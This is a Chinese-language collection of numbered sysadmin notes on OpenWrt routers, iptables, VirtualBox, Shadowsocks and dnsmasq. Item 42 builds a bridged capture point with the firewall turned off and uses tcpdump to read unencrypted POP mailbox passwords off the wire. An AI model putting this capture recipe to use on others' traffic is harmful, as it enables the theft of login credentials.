命令行参数

你可以用命令行参数覆盖 config.json 中的设置：

sslocal -s server_addr -p server_port -l local_port -k password -m bf-cfb
ssserver -p server_port -k password -m bf-cfb --workers 2
ssserver -c /etc/shadowsocks/config.json
用 -h 查看所有参数。

Wiki

所有的文档都可以在 Wiki 里找到： https://github.com/clowwindy/shadowsocks/wiki


卸载方法：
使用 root 用户登录，运行以下命令：

./shadowsocks-libev.sh uninstall

----------------------------------------------------------------------------------------------------------------
33、ubuntu中启动及关闭iptables 【Ubuntu】

在ubuntu中由于不存在 /etc/init.d/iptales文件，所以无法使用service等命令来启动iptables，需要用modprobe命令。
启动iptables
modprobe ip_tables
关闭iptables（关闭命令要比启动复杂）
iptables -F
iptables -X
iptables -Z
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
modprobe -r ip_tables
依次执行以上命令即可关闭iptables，否则在执行modproble -r ip_tables时将会提示
FATAL: Module ip_tables is in use.
----------------------------------------------------------------------------------------------------------------
34、VirtualBox 虚拟磁盘互转的命令：

VirtualBox之vdi、vhd、vmdk虚拟硬盘格式相互转换 





Windows7的引导程序能够引导vhd格式的虚拟硬盘，
而VirtualBox创建的虚拟硬盘文件是vdi格式的，怎么办呢？

以前要借助其他软件才能实现，
但是VirtualBox早就悄悄为我们带来了一个VBoxManager.exe来转换格式。

命令如下
(Windows环境，Linux版的应该也有VBoxManager这个二进制文件)：


VBoxManager存在于VirtualBox的安装目录下。



vmdk转换成vdi


VBoxManage.exe clonehd source.vmdk target.vdi --format VDI 



vdi转换成vmdk
VBoxManage.exe clonehd source.vdi target.vmdk --format VMDK 



vdi转换成vhd
VBoxManage.exe clonehd source.vdi target.vhd --format VHD 



vmdk转vhd，vhd转vdi、vmdk的话稍微改一点参数就OK了。需要注意的是运行完命令之后，原文件并不会被删除
----------------------------------------------------------------------------------------------------------------
35、CentOS 安装 nslookup 方法：

$ yum install bind-utils
----------------------------------------------------------------------------------------------------------------
36、CentOS 安装 dig 方法

$
----------------------------------------------------------------------------------------------------------------
37、OpenWrt 开启 sftp 的方法 【OpenWrt】

root@OpenWrt:~# opkg update
root@OpenWrt:~# opkg install vsftpd openssh-sftp-server
root@OpenWrt:~# /etc/init.d/vsftpd enable
root@OpenWrt:~# /etc/init.d/vsftpd start

----------------------------------------------------------------------------------------------------------------
37a、OpenWrt 查看和修改 PPPOE 的方法 【OpenWrt】

$ vi /etc/config/network

----------------------------------------------------------------------------------------------------------------
37b、OpenWrt 查看和修改 WIFI 中继连接的方法 【OpenWrt】

$ vi /etc/config/wireless

----------------------------------------------------------------------------------------------------------------
37c、OpenWrt_Mini 刷机和复位的方法 TP-720N  【OpenWrt】
shaoqizj(2014-12-17 19:40:32):
20140322新增了httpd模式刷机视频教程，有需要的可以找我要哦！
1.手工设置有线网卡ip 192.168.1.100 掩码255.255.255.0
2.接好网线（网线必须连接到 LAN/WLAN 口）后，按住reset按钮，接电源，直到蓝色指示灯闪烁5次后松开reset按钮；
  设置电脑IP：192.168.1.100 255.255.255.0 192.168.1.1
3.用浏览器(建议火狐或者Google Chrome)打开192.168.1.1，会看到英文刷机界面
4.浏览选择你要刷机的固件，选好后点上传（upload）
注意：刷原厂固件的话必须使用本店的特别版原厂固件才可以刷，不然是没有无线信号的！！！
5.耐心等待5-6分钟左右，指示灯不闪烁，就可以进入固件界面啦

openwrt固件复位方法：通电后，指示灯会闪一次，然后熄灭大概10秒左右后，开始闪烁，开始闪烁的5秒之内，快速按reset按钮几次，
指示灯会变成快速闪烁，这就是进入openwrt安全模式的指示灯！！（不成功的话多试几次，实在不行就只能用uboot刷咯）
同样是手工指定IP地址，运行 telnet 192.168.1.1。出现界面后，执行命令firstboot回车，等到有信息返回后就可以断电重启，
指示灯不闪烁后就可以进入界面了！
刷机和复位

----------------------------------------------------------------------------------------------------------------
37d、教程：720N 用OpenWRT进行WIFI中继/WIFI路由中继/接力——扩大WIFI覆盖范围  【OpenWrt】

原文链接：http://blog.csdn.net/fanfank/article/details/18796411


因为准备去实习，所以把宿舍很多东西都带回家了，包括一个装了OpenWRT的路由器WR703N。

Step 0 : 为什么要这么做
在家里有一个地方不爽，就是WIFI的信号覆盖不到我的房间，所以我就想这个时候进行一下WIFI的接力，用WR703N接收WIFI使其能连接网络，然后同时发出WIFI，好让我在房间可以上网。

有的路由器本身就有WIFI接力的功能，所以我写这篇东西是因为我的路由器已经装了OpenWRT了必须要进行配置才行，在这里就把配置过程写出来。下面也会教你怎么安装OpenWRT。

Step 1 : 安装OpenWRT并使其发WIFI，然后用ssh连接
这比起上一篇教程《路由器连接校园网并发WIFI：WR703N路由器安装OpenWRT并运行H3C客户端操作步骤（主要针对中山大学东校区）》要方便不少，首先你需要安装好OpenWRT到你的路由器，安装方法（对于WR703N）请参见这个句子前面所说的那篇教程的Step 1 ~ Step 6。

通过上面的步骤，你已经可以连接到你的路由器发出来的WIFI啦，然后使用命令

[plain] view plaincopy在CODE上查看代码片派生到我的代码片
ssh root@192.168.1.1  

或者使用Windows下的putty软件连接到OpenWRT（不能使用ssh？参照上面那篇文章看是不是telnet的时候没有修改密码）。
Step 2 : 关于WIFI接力的个人推断（这一步跳过也没有问题）
我有一个十分不正式的理解，到底这个WIFI接力是怎么实现的？我个人推断是这样：首先你的OpenWRT连接其他人（或者是你家里）发出来的WIFI（称为WIFI1），组成了一个网络a，这个时候网络a是可以连接互联网的；然后你的OpenWRT自己发出了另外一个WIFI（称为WIFI2），你的电脑连接到WIFI2，组成了网络b。要让网络b中的设备能够连接互联网，必须将网络a和网络b打通才行。

可能会有人觉得奇怪，网络a中的OpenWRT是可以联网的，那么这个OpenWRT发出的WIFI2为什么是不能联网的？因为……说起来比较复杂，涉及到静态IP，DHCP等东西，我自己也没有搞得很明白，不过各位就记住网络a和网络b需要通过一些方法进行连接起来才能用。

以下划了删除线的部分请各位跳过，因为个人推断的成分太过多。


我在事后发现，WR703N的OpenWRT本身就已经把两个网络a和网络b接起来了，来自网络b的请求会自动转发到网络a。如果你的OpenWRT不是这样，请参见http://wiki.openwrt.org/doc/recipes/relayclient。

Step 3 : 让OpenWRT能连接WIFI
上一段说了一些完全不知道对不对的理论，现在开始实际操作，首先编辑/etc/config下的wireless文件，命令是

[plain] view plaincopy在CODE上查看代码片派生到我的代码片
vi /etc/config/wireless  

在“#option disabled 1”这一行下面加入OpenWRT连接WIFI的配置，内容如下：
[plain] view plaincopy在CODE上查看代码片派生到我的代码片
config wifi-iface 'wlan0'                   
        option device   'radio0'            
        option network  'wan'               
        option mode     'sta'               
        option ssid     要连接到的WIFI名称    
        option encryption 'psk2'          
        option key      那个WIFI的连接密码是多少   

然后按Esc退到普通模式，输入“:wq”保存并退出。
Step 4 : 让OpenWRT对WIFI进行接力
接着编辑/etc/config下的network文件，命令是

[plain] view plaincopy在CODE上查看代码片派生到我的代码片
vi /etc/config/network  

好啦这里要注意，首先将原本的“option ipaddr '192.168.1.1'”改为“option ipaddr '192.168.2.1'”，其次在文件的最末尾加上以下内容：

[plain] view plaincopy在CODE上查看代码片派生到我的代码片
config interface 'wan'  
        option proto 'dhcp'  
        option ifname 'wlan0'  

接着保存并退出。
Step 5 : 注意事项及结果验证
这个时候要注意了！你以后要连接到OpenWRT不再是输入“ssh root@192.168.1.1”，而是输入“ssh root@192.168.2.1”，一定要记住啦！

最后输入以下命令重启OpenWRT：

[plain] view plaincopy在CODE上查看代码片派生到我的代码片
reboot && exit  

重启后连接到OpenWRT的WIFI，看是不是可以上网了。这样WIFI接力就完成啦~
——————教程结束——————


如果按照以上设置没有成功，有可能是有的地方配置不对，也可能是OpenWRT 版本的不同造成的。对于后面一种情况，可以参考一下划了删除线的部分，那个部分其实不太完整，我没有将所有的操作过程都贴出来（因为发现在WR703N上不用那么操作也能达到目的），同时参照这个地址http://wiki.openwrt.org/doc/recipes/relayclient，进行设置。

参考资料：

http://wiki.openwrt.org/doc/recipes/relayclient
http://wiki.openwrt.org/zh-cn/doc/uci/network
http://wiki.openwrt.org/zh-cn/doc/uci/wireless

文章作者：fanfank@CSDN

原文地址：http://blog.csdn.net/fanfank/article/details/18796411

----------------------------------------------------------------------------------------------------------------
37d、TL-WR720N刷Openwrt 和 常用软件安装 【OpenWRT】

原文链接1：http://scease.blog.163.com/blog/static/2258911802013111011352717/
原文链接2：http://blog.163.com/l1_jun/blog/static/14386388201441344612/

目录
一、刷机

二、设置SSH登录

三、WAN/LAN网络设置

四、Wifi设置

五、支持USB

六、支持extroot

七、安装luci

八、安装samba

九、安装Transmission

十、DLNA

 

一、刷机
Openwrt针对每种路由器提供两个固件文件，factory.bin用于路由器原厂固件初次改刷为Openwrt使用，sysupgrade.bin用于从旧版本Openwrt升级到新版使用。

Openwrt基于WR720N的固件位于http://downloads.openwrt.org/snapshots/trunk/ar71xx/，固件文件：openw71xx-generic-tl-wr720n-v3-squashfs-factory.bin用于初次改刷，openwrt-ar71xx-generic-tl-wr720n-v3-squashfs-sysupgrade.bin在升级时使用。

TL-WR720N初次刷Openwrt方法：选择系统工具 -> 软件升级，在如下图中选择Openwrt固件文件，点击升级即可。

TL-WR720N刷Openwrt 和 常用软件安装 - csneteasy - pg的博客
 

二、设置SSH登录
使用telent客户端登陆，初始IP地址为192.168.1.1

telnet 192.168.1.1 

设置密码

root@OpenWrt:/# passwd 

以后再登录就需要用ssh客户端了，我用putty。

 login as: root

root@192.168.1.1's password:

 BusyBox v1.19.4 (2013-11-23 22:58:54 UTC) built-in shell (ash)

Enter 'help' for a list of built-in commands.

   _______                     ________        __

 |       |.-----.-----.-----.|  |  |  |.----.|  |_

 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|

 |_______||   __|_____|__|__||________||__|  |____|

          |__| W I R E L E S S   F R E E D O M

 -----------------------------------------------------

 BARRIER BREAKER (Bleeding Edge, r38896)

 -----------------------------------------------------

  * 1/2 oz Galliano         Pour all ingredients into

  * 4 oz cold Coffee        an irish coffee mug filled

  * 1 1/2 oz Dark Rum       with crushed ice. Stir.

  * 2 tsp. Creme de Cacao

 -----------------------------------------------------

root@OpenWrt:~# 

三、WAN/LAN网络设置
网络配置文件为/etc/config/network，修改参考如下（红色为修改行，蓝色为添加行）：

root@OpenWrt:~# vi /etc/config/network

config interface 'loopback'

        option ifname 'lo'

        option proto 'static'

        option ipaddr '127.0.0.1'

        option netmask '255.0.0.0'

 

config globals 'globals'

        option ula_prefix 'fd0f:5d48:301c::/48'

 

### LAN口设置修改，基本不用修改 ###

config interface 'lan'    

        option ifname 'eth1'

        option type 'bridge'

        option proto 'static'

        option ipaddr '192.169.1.1'        

        option netmask '255.255.255.0'

        option ip6assign '60'

 

### WAN口PPPoE ###

config interface 'wan'

        option ifname 'eth0'

#####   option proto 'dhcp'

        option proto 'pppoe'

        option 'username'  'user'

        option 'password' 'password'

 

config interface 'wan6'

        option ifname '@wan'

        option proto 'dhcpv6'

 

四、Wifi设置
Wifi配置文件为/etc/config/wireless，下面是设置wifi名称为wr-ow，采用psk2认证方式、密码123456。

root@OpenWrt:~# vi /etc/config/wireless

config wifi-device  radio0

        option type     mac80211

        option channel  11

        option hwmode   11ng

        option path     'platform/ar933x_wmac'

        option htmode   HT20

        list ht_capab   SHORT-GI-20

        list ht_capab   SHORT-GI-40

        list ht_capab   RX-STBC1

        list ht_capab   DSSS_CCK-40

        # REMOVE THIS LINE TO ENABLE WIFI:

#####   option disabled 1

 

config wifi-iface

        option device   radio0

        option network  lan

        option mode     ap

option ssid     wr-ow

#####   option encryption none

        option encryption psk2

        option key 123456 

五、支持USB
WR720有一个USB接口，可以接入USB存储设备。USB要先格式化Openwrt可识别分区，我是在Ubuntu下面格式化为ext4分区格式的。

先查询接入系统的USB硬盘，使用dmesg显示信息

[  242.090000] usb 1-1: new high-speed USB device number 2 using ehci-platform

说明是接口是USB2.0，需要kmod-usb2模块，固件缺省已安装

 

接下来只需安装kmod-usg-storage、kmod-fs-ext4内核模块，其他模块已缺省安装，执行：

root@OpenWrt:~# opkg install kmod-usb-storage

root@OpenWrt:~# opkg install kmod-fs-ext4

root@OpenWrt:~#reboot

 

启动后，查看是否已经支持：

root@OpenWrt:~# ls /dev/sda*

/dev/sda   /dev/sda1  /dev/sda2  /dev/sda3

 

参考：http://wiki.openwrt.org/doc/howto/usb.storage

http://wiki.openwrt.org/doc/howto/usb.essentials  

六、支持extroot
WR720N只有4MB Flash存储，根分区放到flash上很小，没有空间安装多个软件；并且大部分软件缺省安装到根分区、安装到其他分区很困难，解决办法就是把根分区加载外部（usb）存储上。处理如下。

 

安装block-mount

root@OpenWrt:~# opkg update

root@OpenWrt:~# opkg install block-mount

root@OpenWrt:~# reboot

 

复制flash根分区文件到外部存储

root@OpenWrt:~# mkdir /mnt/sda1

root@OpenWrt:~# mount /dev/sda1 /mnt/sda1

root@OpenWrt:~# mkdir -p /tmp/cproot

root@OpenWrt:~# mount --bind / /tmp/cproot/

root@OpenWrt:/# tar -C /tmp/cproot/ -cvf - . | tar -C /mnt/sda1 -xf -

root@OpenWrt:/# umount /dev/sda1

 

修改fstab

root@OpenWrt:~# vi /etc/config/fstab

config 'global'

        option  anon_swap       '0'

        option  anon_mount      '0'

        option  auto_swap       '1'

        option  auto_mount      '1'

        option  delay_root      '5'

        option  check_fs        '0'

 

### USB硬盘的第一个分区用作根分区###

config 'mount'

        option  target  '/'

        option  device /dev/sda1

        option  fstype  ext4

        option  options rw,sync

        option  enabled '1'

        option  enabled_fsck 0

 

### USB硬盘的第二个分区用作交换分区 ###

config 'swap'

        option  device  '/dev/sda2'

        option  enabled '1'

 

### USB硬盘的第三个分区用作home分区 ###

config 'mount'

        option  target  '/home'

        option  device  /dev/sda3

        option  fstype  ext4

        option  options rw,sync

        option  enabled '1'

        option  enabled_fsck 0

 

参考：  http://wiki.openwrt.org/doc/howto/extroot

七、安装luci
root@OpenWrt:/# opkg update

root@OpenWrt:~# opkg install luci
root@OpenWrt:~# /etc/init.d/uhttpd enable
root@OpenWrt:~# /etc/init.d/uhttpd start
root@OpenWrt:~# 

参考： http://wiki.openwrt.org/doc/howto/luci.essentials


八、安装samba
先查询当前可用的samba版本号和包名

root@OpenWrt:/# opkg update

root@OpenWrt:~# opkg list | grep  samba

luci-app-samba - svn-r9834-1 - Network Shares - Samba SMB/CIFS module

samba36-client - 3.6.11-2 - Samba 3.6 SMB/CIFS client

samba36-server - 3.6.11-2 - The Samba software suite is a collection of programs that implements the SMB protocol for UNIX systems, allowing you to serve files and printers to Windows, NT, OS/2 and DOS clients. This protocol is sometimes also referred to as the LanManager or Netbios protocol.


然后安装

root@OpenWrt:~# opkg install samba36-server

root@OpenWrt:~# opkg install luci-app-samba

root@OpenWrt:~# /etc/init.d/samba enable

root@OpenWrt:~# /etc/init.d/samba start

root@OpenWrt:~# reboot

 
配置过程如下：
先增加samba用户root
root@OpenWrt:~# smbpasswd -a root

可以使用luci通过Web进行配置
TL-WR720N刷Openwrt 和 常用软件安装 - csneteasy - pg的博客
 
修改root用户可以访问samba，编辑template里面的invalid users = root为下图：
TL-WR720N刷Openwrt 和 常用软件安装 - csneteasy - pg的博客
 

增加共享目录
TL-WR720N刷Openwrt 和 常用软件安装 - csneteasy - pg的博客

参考： http://wiki.openwrt.org/doc/uci/samba

九、安装Transmission
安装Transmission支持BT下载，以后再BT下载就不用开电脑了，省电。

root@OpenWrt:/# opkg update?

root@OpenWrt:~# opkg install transmission-daemon

root@OpenWrt:~# opkg install transmission-cli

root@OpenWrt:~# opkg install transmission-web

root@OpenWrt:~# opkg install transmission-remote

root@OpenWrt:~# /etc/init.d/transmission enable

root@OpenWrt:~# /etc/init.d/transmission start

root@OpenWrt:~#

 

配置如下：

root@OpenWrt: /# vi /etc/config/transmission

config transmission

        option enabled 1

        option config_dir '/home/trans'

        #option user 'nobody'

        option alt_speed_down 50

        option alt_speed_enabled false

        option alt_speed_time_begin  540

        option alt_speed_time_day 127

        option alt_speed_time_enabled false

        option alt_speed_time_end 1020

        option alt_speed_up 50

        option bind_address_ipv4 '0.0.0.0'

        option bind_address_ipv6 '::'

        option blocklist_enabled false

        option blocklist_url ''

        option cache_size_mb 2

        option dht_enabled true

        option download_dir '/home/trans/done'

        option download_queue_enabled true

        option download_queue_size 4

        option encryption 1

        option idle_seeding_limit 30

        option idle_seeding_limit_enabled false

        option incomplete_dir '/home/trans/incomplete'

        option incomplete_dir_enabled false

        option lazy_bitfield_enabled true

        option lpd_enabled false

        option message_level 1

        option peer_congestion_algorithm ''

        option peer_limit_global 240

        option peer_limit_per_torrent 60

        option peer_port 51413

        option peer_port_random_high 65535

        option peer_port_random_low 49152

        option peer_port_random_on_start false

        option peer_socket_tos 'default'

        option pex_enabled true

        option port_forwarding_enabled true

        option preallocation 1

        option prefetch_enabled true

        option queue_stalled_enabled true

        option queue_stalled_minutes 30

        option ratio_limit 2.0000

        option ratio_limit_enabled false

        option rename_partial_files true

        option rpc_authentication_required false

        option rpc_bind_address '0.0.0.0'

        option rpc_enabled true

        option rpc_password '12345678'

        option rpc_port 9091

        option rpc_url '/transmission/'

        option rpc_username 'zp'

        option rpc_whitelist '127.0.0.1,192.169.1.*'

        option rpc_whitelist_enabled true

        option scrape_paused_torrents_enabled true

        option script_torrent_done_enabled false

        option script_torrent_done_filename ''

        option seed_queue_enabled false

        option seed_queue_size 10

        option speed_limit_down 100

        option speed_limit_down_enabled false

        option speed_limit_up 20

        option speed_limit_up_enabled false

        option start_added_torrents true

        option trash_original_torrent_files false

        option umask 18

        option upload_slots_per_torrent 14

        option utp_enabled true

        option scrape_paused_torrents true

        option watch_dir_enabled false

        option watch_dir ''

root@OpenWrt:/ #

参考：  http://wiki.openwrt.org/doc/uci/transmission

 

十、DLNA
支持DLNA后，内容在网络上，就相当于云路由器了。

root@OpenWrt:/# opkg update

root@OpenWrt:/# opkg install minidlna

root@OpenWrt:/# /etc/init.d/minidlna enable

root@OpenWrt:/# /etc/init.d/minidlna start

 

配置如下：

root@OpenWrt:~# cat /etc/config/minidlna

config minidlna config

        option 'enabled' '1'

        option port '8200'

        option interface 'br-lan'

        option friendly_name 'OpenWrt DLNA Server'

        option db_dir '/home/dlna/run/minidlna'

        option log_dir '/var/log'

        option inotify '1'

        option enable_tivo '0'

        option strict_dlna '0'

        option presentation_url ''

        #option notify_interval '900'

        option notify_interval '60'

        option serial '12345678'

        option model_number '1'

        option root_container '.'

        list media_dir '/home/dlna'

        option album_art_names 'Cover.jpg/cover.jpg/AlbumArtSmall.jpg/albumartsmall.jpg/AlbumArt.jpg/albumart.jpg/Album.jpg/album.jpg/Folder.jpg/folder.jpg/Thumb.jpg/thumb.jpg'

root@OpenWrt:~#

 当前Openwrt固件版本有个Bug，就是往DLNA目录下添加文件，不能自动更新。经验证可以用下面方法解决：

修改/etc/init.d/minidlna在minidlna启动时添加-R参数

start() {

       ……

        service_start /usr/bin/minidlna -R -f "$MINIDLNA_CONFIG_FILE"

} 

参考：http://wiki.openwrt.org/doc/uci/minidlna

----------------------------------------------------------------------------------------------------------------
38、安装 Shadwosocks 出错的解决办法：【OpenWRT】

http://cokebar.info/archives/664

【错误提示】
root@OpenWrt:/tmp# opkg install shadowsocks-libev-spec_1.5.3-1_atheros.ipk
Unknown package 'shadowsocks-libev-spec'.
Collected errors:
 * pkg_hash_fetch_best_installation_candidate: Packages for shadowsocks-libev-spec found, but incompatible with the architectures configured
 * opkg_install_cmd: Cannot install package shadowsocks-libev-spec.

【解决办法】
找到CPU的型号，不是品牌名称
品牌名称：Atheros
型号是：AR7161 rev 2
选择： ar71xx 的 ipk

----------------------------------------------------------------------------------------------------------------
39、OpenWRT 中配置 Dnsmasq 支持 Hosts 解析的方法：【OpenWRT】

方法一：配置 dnsmasq

修改 /etc/dnsmasq.conf 添加如下
address=/www.xxx.com/192.168.1.100


方法二：编辑 DHCP

$ vi /etc/config/dhcp
在dnsmasq段的末尾插入：

list addnhosts '/etc/hosts'

然后改/etc/hosts就可以了。

----------------------------------------------------------------------------------------------------------------
40、OpenWRT 配置 PPPOE 拨号的设置方法：【OpenWRT】

配置 PPPoE：

$ uci set network.wan.proto=pppoe
$ uci set network.wan.username='yougotthisfromyour@isp.su'
$ uci set network.wan.password='yourpassword'
$ uci commit network
$ ifup wan

----------------------------------------------------------------------------------------------------------------
41、OpenWRT 中配置 DNSmasq 和 VPN 的方法: 【OpenWRT】

3.配置 DNS
　　a.创建 /etc/config/sec_resolv.conf

vim /etc/config/sec_resolv.conf
　　填入以下 DNS Servers:

nameserver 8.8.8.8
nameserver 8.8.4.4
nameserver 208.67.222.222

　　b.编辑 /etc/config/dhcp

vim /etc/config/dhcp
　　找到 option resolvfile 选项，替换为：

option resolvfile '/etc/config/sec_resolv.conf'
　　4.配置 PPTP
　　a.安装 ppp-mod-pptp

opkg updateopkg install ppp-mod-pptp
  
　　如果需要 LuCI 支持（推荐）：

opkg install luci-proto-ppp
  
　　b.配置 vpn 接口，编辑 /etc/config/network 文件，应该已经有以下内容（如果没有，需要插入），并配置里面的 server、username 和 password：

config 'interface' 'vpn' 
        option 'ifname'    'pptp-vpn'  
        option 'proto'     'pptp'
        option 'username'  'vpnusername'
        option 'password'  'vpnpassword'
        option 'server'    'vpn.example.org or ipaddress' 
        option 'buffering' '1' 

----------------------------------------------------------------------------------------------------------------
42、OpenWRT 下安装 tcpdump 包：【OpenWRT】
http://www.freezhongzi.info/?p=108

$ opkg update
$ opkg install tcpdump

【监听命令】 $ tcpdump -X -i eth0 port 443 (根据端口进行监听，也可以直接监听DNS 53 端口，110 是POP非SSL端口)



【如果还需要安装虚拟网卡网桥监听，可以用以下方法，但注意此功能需要关闭防火墙，故不建议：】

在OpenWrt上需要开启VLAN来模拟两个虚拟子网vlan0和vlan1

config switch eth1
        option reset 1
        option enable_vlan 1

config switch_vlan
        option vlan 0
        option device eth1
        option ports '0 1 2 5t'

config switch_vlan
        option vlan 1
        option device eth1
        option ports '3 5t'
两个vlan网络接口分别为eth1.0和eth1.1，0、1、2口为一个子网，3口单独一个子网。现在把eth1.0和eth1.1两个网络接口组成一个网桥br0：

config interface br0
        option type bridge
        option ifname 'eth1.0 eth1.1'
        option proto none

br0默认不设置ip，因为我直接用TTL线获得Shell所以用不着。如果你想远程访问OpenWrt，则必须按情况设置static或dhcp，当然也可以用前一篇说到底Wifi客户端，这样你就可以舒舒服服的坐在电脑边远程登录查看抓包了:)。

最后一步是关闭防火墙，因为网桥用不着：

/etc/init.d/firewall disable
重启网络后可以用ifconfig看到很多网络接口，只要监听br-br0就行了：

br-br0    Link encap:Ethernet  HWaddr 00:74:04:07:4B:CC
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth1      Link encap:Ethernet  HWaddr 00:74:04:07:4B:CC
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
          Interrupt:14

eth1.0    Link encap:Ethernet  HWaddr 00:74:04:07:4B:CC
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth1.1    Link encap:Ethernet  HWaddr 00:74:04:07:4B:CC
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
测试
首先在OpenWrt里安装Tcpdump：
opkg install tcpdump
用网线连接电脑到路由器3口（eth1.1），路由器2口（或0、1口）连接原本电脑的出口。
运行Tcpdump监听POP邮箱密码：
tcpdump -X -i br-br0 port 110
如果你的邮箱没加SSL的话，应该能看到密码明文啦:)。



启动# service dnsmasq restart
启动# dnscrypt-proxy --daemonize
虚拟机监听# sudo tcpdump -i eth4 dst port 53 or src port 53 -n -x -X -v
路由器监听# tcpdump -X -i eth0 port 443 (110 是POP非SSL端口)

----------------------------------------------------------------------------------------------------------------
43、OpenWRT 安全：【OpenWrt】
http://www.vinoca.org/2012/10/28/openwrt%E7%9A%84%E5%AE%89%E5%85%A8/

OpenWrt的安全
對于WebUI，使用加密傳輸， 步驟很簡單：

安裝証書生成工具與uhttpd的TLS插件：
$ opkg install px5g uhttpd-mod-tls

刪除http服務端口：
$ uci delete uhttpd.main.listen_http
$ uci commit

重啟uhttpd ：
$ /etc/init.d/uhttpd restart

刪除密鈅生成工具：
$ opkg remove px5g
 
而對于ssh，這篇文章給出的辦法是改端口，這可以避免大部分的攻擊，若不幸端口被掃描到，
可以用 iptables -I INPUT -s ip_address -j DROP 來阻止猜解。

----------------------------------------------------------------------------------------------------------------

44、强制 443 HTTPS：【Ngnix】

小编今天搬迁服务器遇到一件棘手问题，HTTP强制转到https，折腾了好几个小时，直接上主题~~~~~~~~
server
{
listen 80;
server_name            ; #server_name end
index index.html index.htm index.php; #index end
#——80 301 443
if ($server_port = 80) {
return 301 https://$server_name$request_uri;
}
if ($scheme = http) {
return 301 https://$server_name$request_uri;
}
error_page 497 https://$server_name$request_uri;
#——80 301 443
｝
就是标注蓝色的一段，直接放进去即可


----------------------------------------------------------------------------------------------------------------
45、虚拟机 Dnsmasq 解析的时候 /etc/dnsmasq.hosts 失效需要 /etc/hosts 辅助的办法：

编辑好其中一个 hosts 之后执行 cp 命令同步复制
$ cp /etc/hosts /etc/dnsmasq.hosts

----------------------------------------------------------------------------------------------------------------
46、Dnsmasq 里屏蔽域名的方法：

编辑 /etc/dnsmasq.conf，在尾部加入以下代码:

address=/doubleclick.net/127.0.0.5
address=/google.doubleclick.cn/127.0.0.5

----------------------------------------------------------------------------------------------------------------
47、VirtualBox 下 clone / cloned 命令：


1、通过CMD进入命令行模式，然后进入virtualbox的目录；
2、输入命令：
C:\>cd "Program Files\Oracle\VirtualBox\
C:\Program Files\Oracle\VirtualBox>VBoxManage clonevdi "windows 2003.vdi" "windo
ws 2003-2.vdi"
Oracle VM VirtualBox Command Line Management Interface Version 3.2.0
(C) 2005-2010 Oracle Corporation
All rights reserved.
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Clone hard disk created in format 'VDI'. UUID: e5ba214a-1cdd-4fd7-b68c-7026bb616
d41
C:\Program Files\Oracle\VirtualBox>

----------------------------------------------------------------------------------------------------------------
48、OpenWRT查看CPU,RAM,Flash信息参数 【OpenWrt】

1.查看Flash容量大小(存储空间,可以理解为电脑的硬盘)
 
root@OpenWrt:/# dmesg |grep spi |grep Kbytes  #查看Flash容量
[    0.680000] m25p80 spi0.0: w25q128 (16384 Kbytes)
#16384/1024=16M 既是16M的Flash

2.查看RAM容量大小（可以理解为电脑的内存条）
 
root@OpenWrt:/# cat /proc/meminfo |grep MemTotal   #查看RAM大小 
MemTotal:          61592 kB
 
root@OpenWrt:/# free -h |grep Mem | awk -F ' ' '{print $2}'  #查看RAM大小 (单位kB)
61592
 
root@OpenWrt:/# free -h |grep Mem | awk -F ' ' '{print $3}' #已使用的RAM大小(单位kB)
25520
 
root@OpenWrt:/# free -h |grep Mem | awk -F ' ' '{print $4}' #空闲可用的RAM大小(单位kB)
35920

3.CPU内存主频型号信
 
root@OpenWrt:/# dmesg |grep Clocks |awk -F ' ' '{print $4}'  #查看CPU主频
CPU:400.000MHz,
 
root@OpenWrt:/# dmesg |grep Clocks |awk -F ',' '{print $2}' #查看内存主频
 DDR:400.000MHz
 
root@OpenWrt:/# cat /proc/cpuinfo |grep 'system type'  #查看系统类型
system type: Atheros AR9330 rev 1
 
root@OpenWrt:/# cat /proc/cpuinfo |grep 'cpu model'  #查看CPU型号
cpu model: MIPS 24Kc V7.4
 
root@OpenWrt:/# cat /proc/cpuinfo |grep 'machine'   #查看设备型号
machine: TP-LINK TL-WR720N v3


----------------------------------------------------------------------------------------------------------------
49、OpenWrt 开通 PPTP 47 1723 端口的命令：【OpenWrt】

$ iptables -A INPUT -p 47 -j ACCEPT
$ iptables -A OUTPUT -p 47 -j ACCEPT
$ iptables -A INPUT -p tcp --dport 1723 -j ACCEPT
$ iptables -A OUTPUT -p tcp --sport 1723 -j ACCEPT

# iptables允许PPTP后，还必须要允许DNS，它必须要用到tcp和udp协议，代码如下：

$ iptables -A OUTPUT -p udp --sport 53 -j ACCEPT
$ iptables -A INPUT -p udp --dport 53 -j ACCEPT

----------------------------------------------------------------------------------------------------------------
50、OpenWrt路由器iptables防火墙自行手工设置示例 【OpenWrt】

OpenWrt默认安装自带了iptables防火墙，并且默认设置了不少规则和策略，尤其是自定义了很多用户规则链，看起来比较复杂。
用iptables -nL 查看，会发现特别多自定义用户链，
root@myopenwrt:~# iptables -nL
Chain INPUT (policy ACCEPT)
target prot opt source destination
bw_ingress all — 0.0.0.0/0 0.0.0.0/0
ACCEPT all — 0.0.0.0/0 0.0.0.0/0
